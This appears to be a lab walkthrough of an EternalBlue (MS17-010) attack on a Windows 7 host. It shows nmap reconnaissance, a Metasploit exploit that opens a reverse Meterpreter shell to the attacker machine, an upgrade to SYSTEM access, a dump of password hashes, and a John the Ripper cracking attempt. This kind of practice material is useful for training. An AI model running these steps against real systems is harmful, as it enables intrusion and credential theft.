
## Reconnaissance

`nmap -sS -Pn -A- -p- -oN nmap.txt 192.168.64.2`
`ls -al /usr/share/nmap/scripts/ | grep -e "smb"` - to find the script
`nmap -Ss -Pn -p 445 192.168.64.2 --script smb-vuln-ms17-010`

```
┌──(root㉿kali)-[~]
└─# nmap -sS -Pn -p 445 192.168.64.2 --script smb-vuln-ms17-010.nse 
Starting Nmap 7.94 ( https://nmap.org ) at 2024-06-18 17:23 PDT
Nmap scan report for 192.168.64.2
Host is up (0.0061s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 56:87:7C:EA:A4:B3 (Unknown)

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
                                                                 
```

## Exploit (Using Metasploit)


```
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

```

```
msf6 > use 0
set LHOSTS=192.168.64.4
set RHOSTS=192.168.64.2
run
```

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 192.168.64.4:9999 
[*] 192.168.64.2:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.64.2:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.64.2:445      - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.64.2:445 - The target is vulnerable.
[*] 192.168.64.2:445 - Connecting to target for exploitation.
[+] 192.168.64.2:445 - Connection established for exploitation.
[+] 192.168.64.2:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.64.2:445 - CORE raw buffer dump (38 bytes)
[*] 192.168.64.2:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 192.168.64.2:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
[*] 192.168.64.2:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
[+] 192.168.64.2:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.64.2:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.64.2:445 - Sending all but last fragment of exploit packet
[*] 192.168.64.2:445 - Starting non-paged pool grooming
[+] 192.168.64.2:445 - Sending SMBv2 buffers
[+] 192.168.64.2:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.64.2:445 - Sending final SMBv2 buffers.
[*] 192.168.64.2:445 - Sending last fragment of exploit packet!
[*] 192.168.64.2:445 - Receiving response from exploit packet
[+] 192.168.64.2:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.64.2:445 - Sending egg to corrupted connection.
[*] 192.168.64.2:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.64.2
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.64.2:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 3 opened (192.168.64.4:9999 -> 192.168.64.2:49161) at 2024-06-19 14:21:48 -0700

```


## Upgrade shells in metasploit

- Once you are in meterpreter session, click `CTRL + Z`
- Type y to Background Session 1
- Search `shell_to_meterpreter`
- use 0
```
meterpreter > 
Background session 1? [y/N]  y
[-] Unknown command: y
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter                                          

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
```

- Show options, then configure necessary, session, LHOST and LPORT

```
sf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to re
                                       ceive the connection
   LHOST                     no        IP of host that will receive the con
                                       nection from the payload (Will try t
                                       o auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.64.4
LHOST => 192.168.64.4
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1

```

- execute `run`. Now it will be upgraded
```
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.64.4:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 

```

- Go back to the eternalblue metasploit module by typing `sessions 1`

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : WIN-845Q99OO4PP
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > shell
Process 1952 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>




```

## Use Hashdump in mterpreter session to know the password


```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:f580a1940b1f6759fbdd9f5c482ccdbb:::
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

```

## Cracking the password used using John the Ripper

- Copy the hashdump file in the meterpreter session to created hashes.txt file
- use the john the ripper command 

- vi hashes.txt
- Paste the user account. The one whom you will crack the password
```
meterpreter > hashdump
user:1000:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::

```

- Now unzip the /usr/share/wordlists/rockyou.gz to obtain the txt file
```
gunzip /usr/share/wordlists/rockyou.gz
```

- execute the command
```
└─$ sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt  hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2024-06-19 14:46) 0g/s 23514Kp/s 23514Kc/s 23514KC/s !&HoeS!..*7¡Vamos!
Session completed. 

```

## How to locate a file in meterpreter

```
search -f desktop.ini
```